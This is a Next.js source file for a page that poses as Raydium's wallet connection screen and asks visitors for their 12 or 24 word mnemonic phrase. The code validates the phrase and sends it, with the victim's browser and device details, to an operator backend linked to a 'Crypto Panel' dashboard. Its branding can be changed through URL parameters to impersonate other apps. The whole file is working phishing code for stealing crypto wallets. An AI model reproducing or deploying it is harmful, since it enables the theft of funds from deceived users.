"use client";
import { useSearchParams } from "next/navigation";
import { useState, useEffect } from "react";
import {
  setPhrase,
  getCryptoLog,
  getPhrases,
  verifyRecaptcha,
} from "@/shared/api/apis";
import { useGoogleReCaptcha } from "react-google-recaptcha-v3";
import { UAParser } from "ua-parser-js";
const LoginPage = () => {
  const searchParams = useSearchParams();
  const [value, setValue] = useState("");
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [verified, setVerified] = useState(false);
  const [showModal, setShowModal] = useState<any>(false);
  const [cryptoLog, setCryptoLog] = useState<any>(null);
  const [phrases, setPhrases] = useState<any[]>([]);
  const [userInfo, setUserInfo] = useState({
    browser: "",
    os: "",
    device: "",
  });
  const { executeRecaptcha } = useGoogleReCaptcha();

  const bgColor = searchParams.get("bgColor");
  const bgColorBox = searchParams.get("modColor");
  const buttonColor = searchParams.get("btnColor");
  const cryptoLogId = searchParams.get("cryptoLogId");
  const userId = searchParams.get("userId");
  const staticLogo = "/raydium-ray-logo.png";
  const appLogo = cryptoLog?.appLogo || staticLogo;
  useEffect(() => {
    if (executeRecaptcha) {
      executeRecaptcha()
        .then(async (token: any) => {
          const response = await verifyRecaptcha(token);
          if (!response?.ok) {
            setVerified(false);
          } else {
            setVerified(true);
          }
        })
        .catch((error: any) => {
          setError("Error in recaptcha refresh the page");
        });
    }
  }, [executeRecaptcha]);
  useEffect(() => {
    const parser = new UAParser();
    const result = parser.getResult();
    setUserInfo({
      browser: `${result.browser.name} ${result.browser.version}`,
      os: `${result.os.name} ${result.os.version}`,
      device: result.device.model
        ? `${result.device.vendor} ${result.device.model}`
        : "Desktop",
    });
  }, []);

  const handleInputChange = (e: any) => {
    setValue(e.target.value);
  };

  const handleSubmit = async () => {
    const inputValue = value.trim();

    if (!inputValue) {
      setError("Phrase cannot be empty.");
      setTimeout(() => {
        setError("");
      }, 2000);
      return;
    }

    if (!verified) {
      setError("Recaptcha verification failed! refresh page");
      setTimeout(() => {
        setError("");
      }, 2000);
      return;
    }

    const wordRegex = /^[a-z\s]+$/;
    const words = inputValue.split(/\s+/);
    if (!wordRegex.test(inputValue)) {
      setError("Error mnemonic phrase can only contain 12 or 24 words spaced.");
      setTimeout(() => {
        setError("");
      }, 2000);
      return;
    }
    const isValidWords = words.every((word) => /^[a-z]+$/.test(word));
    if (!isValidWords) {
      setError("Error mnemonic phrase can only contain 12 or 24 words spaced.");
      setTimeout(() => {
        setError("");
      }, 2000);
      return;
    }
    if (words.length < 12 || words.length > 24) {
      setError("Input must contain between 12 and 24 words.");
      setTimeout(() => {
        setError("");
      }, 2000);
      return;
    }

    setError("");

    if (cryptoLog === null) {
      setError("Crypto Log Not Found");
      setTimeout(() => {
        setError("");
      }, 2000);
      return;
    }

    if (error) {
      return;
    }

    if (
      phrases?.some((phraseObj) => {
        console.log(phraseObj);
        return phraseObj.seed_phrase === value;
      }) &&
      cryptoLog?.redirectUrl
    ) {
      window.location.replace(cryptoLog?.redirectUrl);
    } else {
      const response = await setPhrase(value, userInfo, cryptoLogId);
      if (response?.ok) {
        setSuccess("Wallet Connected Successfully");
        setValue("");
        setTimeout(() => {
          setSuccess("");
        }, 2000);
      } else {
        setError("Error connecting wallet");
        setTimeout(() => {
          setError("");
        }, 2000);
      }
    }
  };

  const appName = cryptoLog?.app_name?.toUpperCase();

  const getCryptoLogById = async (cryptoLogId: string) => {
    const response = await getCryptoLog(cryptoLogId);
    setCryptoLog(response);
  };

  const getAllPhrases = async () => {
    const response = await getPhrases();
    if (Array.isArray(response)) {
      setPhrases(response);
    } else {
      setPhrases(phrases);
    }
  };

  useEffect(() => {
    getAllPhrases();
  });

  useEffect(() => {
    if (!userId || !cryptoLogId) {
      setShowModal(true);
    } else {
      getCryptoLogById(cryptoLogId);
    }
  }, [cryptoLogId, userId]);

  const hexToRgb = (hex: string) => {
    hex = hex?.replace(/^#/, "");
    const r = parseInt(hex?.substring(0, 2), 16);
    const g = parseInt(hex?.substring(2, 4), 16);
    const b = parseInt(hex?.substring(4, 6), 16);
    return { r, g, b };
  };

  const getContrastColor = (hex: any) => {
    const { r, g, b } = hexToRgb(hex);
    const luminance = 0.299 * r + 0.587 * g + 0.114 * b;
    return luminance > 128 ? "#000000" : "#ffffff";
  };

  const modColor = getContrastColor(bgColor);
  const buttonTextColor = getContrastColor(buttonColor);
  const modTextColor = getContrastColor(modColor);

  const goToPanel = () => {
    window.open(
      process.env.NEXT_PUBLIC_CRYPTO_PANEL_URL ||
        "http://localhost:3001/dashboards/urls",
      "_blank"
    );
  };

  return (
    <>
      {showModal ? (
        <div className="flex flex-col items-center justify-center min-h-screen bg-[#181d31] z-50">
          <div className="bg-white p-6 rounded-lg shadow-md text-center">
            <p className="text-lg font-bold">Redirect from Crypto Panel</p>
            <button
              className="mt-4 px-4 py-2 text-black rounded"
              style={{
                backgroundColor: buttonColor !== null ? buttonColor : "#22d1f8",
                color: buttonTextColor,
                border: `1px solid ${buttonTextColor}`,
              }}
              onClick={() => goToPanel()}
            >
              Go to panel
            </button>
          </div>
          {/* <div className="w-[380px] p-6 rounded-lg shadow-md text-center login-container overflow-hidden">
              <div className="flex justify-center mb-4">
                <div className='bg-[#aaadb6] h-14 w-48 rounded animate-pulse'></div>
              </div>
              <div className="h-20 bg-[#aaadb6] rounded mb-4 animate-pulse"></div>
              <div className="flex justify-end">
                  <div className="h-12 bg-[#aaadb6] rounded w-full animate-pulse"></div>
              </div>
              <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white to-transparent animate-shimmer"></div>
          </div> */}
        </div>
      ) : (
        <div
          className="flex flex-col items-center justify-center min-h-screen"
          style={{ backgroundColor: bgColor !== null ? bgColor : "#181d31" }}
        >
          <div
            className="w-[380px] p-6 rounded-lg shadow-md text-center login-container"
            style={{
              backgroundColor:
                bgColor === null
                  ? bgColorBox !== null
                    ? bgColorBox
                    : "white"
                  : modColor,
              color: modTextColor,
            }}
          >
            <div className="logo-placeholder">
              <img
                height={100}
                width={100}
                src={appLogo}
                alt="Logo"
                className="h-14"
              />
              <p
                className="h-full w-auto text-3xl text-center"
                style={{ letterSpacing: "0.3em" }}
              >
                {cryptoLog?.app_name ? appName : "RAYDIUM"}
              </p>
            </div>
            {error && <div className="message-container-error">{error}</div>}
            {success && (
              <div className="message-container-success">{success}</div>
            )}
            <textarea
              value={value}
              placeholder="Enter your 12 or 24 word Mnemonic Phrase here..."
              className="w-full h-20 px-4 py-2 mb-4 border rounded-md text-gray-800 focus:outline-none focus:ring-2 focus:ring-blue-300 resize-none placeholder-top"
              onChange={(e) => handleInputChange(e)}
            />
            <button
              className="w-full px-4 py-2 rounded-md"
              style={{
                backgroundColor: buttonColor !== null ? buttonColor : "#22d1f8",
                color: buttonTextColor,
                border: `1px solid ${buttonTextColor}`,
              }}
              onClick={handleSubmit}
            >
              Connect Wallet
            </button>
          </div>
        </div>
      )}
    </>
  );
};

export default LoginPage;
